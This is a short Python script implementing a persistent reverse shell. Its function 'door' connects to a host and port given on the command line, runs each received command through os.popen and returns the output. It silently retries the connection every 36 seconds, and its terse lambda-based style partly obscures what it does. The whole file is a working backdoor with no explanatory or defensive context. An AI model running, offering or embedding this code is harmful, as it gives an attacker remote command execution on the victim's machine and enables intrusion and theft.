#!/usr/bin/env python
import os
import time
from socket import*

def door(h, p):
    while 6:
        try:
            C = socket(AF_INET, SOCK_STREAM)
            C.connect((h, int(p)))
            S, R = C.send, C.recv
            T = lambda I: I("utf-8")
            E = lambda I: T(I.encode)
            D = lambda I: T(I.decode)
            while 6: S(E(os.popen(D(R(1024))).read()) or b"\xff")
        except Exception:
            time.sleep(6*6)

if __name__ == "__main__":
    import sys
    door(*sys.argv[1].split(":"))
